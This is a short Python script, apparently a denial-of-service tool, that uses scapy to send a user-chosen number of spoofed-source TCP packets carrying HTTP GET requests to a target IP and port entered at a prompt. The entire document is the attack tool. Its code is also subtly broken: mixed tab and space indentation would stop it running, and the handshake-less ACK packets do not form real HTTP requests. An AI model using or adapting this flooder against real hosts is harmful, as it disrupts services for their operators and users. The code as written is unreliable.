#!/usr/bin/python3
from scapy.all import *
from random import randint

def randomIP():
	ip = ".".join(map(str, (randint(0,255)for _ in range(4))))
	return ip


def randInt():
	x = randint(1000,9000)
	return x


def HTTP_Flood(dstIP,dstPort,counter):
	total = 0
	print ("Packets are sending ...")

	for x in range (0,counter):
		s_port = randInt()
		s_eq = randInt()

		IP_Packet = IP ()
		IP_Packet.src = randomIP()
		IP_Packet.dst = dstIP

		TCP_Packet = TCP ()
		TCP_Packet.sport = s_port
		TCP_Packet.dport = dstPort
		TCP_Packet.flags = "A"
		TCP_Packet.seq = s_eq
        
        HTTP_payload = f"GET / HTTP/1.0\r\nHOST: {dstIP}\r\n\r\n"
		send(IP_Packet/TCP_Packet/HTTP_payload)
		total+=1

	print("\nTotal packets sent: %i\n" % total)


def info():

	dstIP = input ("\nTarget IP : ")
	dstPort = input ("Target Port : ")

	return dstIP,int(dstPort)


def main():
	dstIP,dstPort = info()
	counter = input ("How many packets do you want to send : ")
	HTTP_Flood(dstIP,dstPort,int(counter))

main()
